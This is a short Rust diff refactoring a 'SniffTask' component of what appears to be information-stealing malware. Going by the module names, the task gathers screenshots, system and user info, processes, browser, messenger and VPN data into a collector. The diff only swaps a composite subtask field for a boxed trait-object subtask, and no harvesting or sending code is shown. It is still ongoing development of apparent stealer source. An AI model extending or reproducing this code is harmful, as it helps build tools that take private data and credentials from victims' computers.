@@ -13,6 +13,7 @@ use crate::processes::ProcessesTask;
 use crate::screenshot::ScreenshotTask;
 use crate::systeminfo::SystemInfoTask;
 use crate::userinfo::UserInfoTask;
+use alloc::boxed::Box;
 use alloc::vec;
 use browsers::BrowsersTask;
 use collector::Collector;
@@ -26,7 +27,7 @@ use vpn::VpnTask;
 
 pub struct SniffTask<C: Collector, F: FileSystem> {
     inner: CompositeTask<C, F>,
-    subtasks: Option<CompositeTask<C, F>>,
+    subtask: Option<Box<dyn Task<C, F>>>,
 }
 
 impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F> {
@@ -44,15 +45,18 @@ impl<C: Collector + 'static, F: FileSystem + 'static> Default for SniffTask<C, F
                 MessengersTask::default(),
                 BrowsersTask::default(),
             ),
-            subtasks: None,
+            subtask: None,
         }
     }
 }
 
 impl<C: Collector + 'static, F: FileSystem + 'static> SniffTask<C, F> {
-    pub fn with_subtasks(composite_task: CompositeTask<C, F>) -> Self {
+    pub fn with_subtask<T>(subtask: T) -> Self
+    where
+        T: Task<C, F> + 'static,
+    {
         Self {
-            subtasks: Some(composite_task),
+            subtask: Some(Box::new(subtask)),
             ..Self::default()
         }
     }
@@ -62,8 +66,8 @@ impl<C: Collector, F: FileSystem> Task<C, F> for SniffTask<C, F> {
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
         self.inner.run(parent, filesystem, collector);
 
-        if let Some(subtasks) = &self.subtasks {
-            subtasks.run(parent, filesystem, collector);
+        if let Some(subtask) = &self.subtask {
+            subtask.run(parent, filesystem, collector);
         }
     }
 }
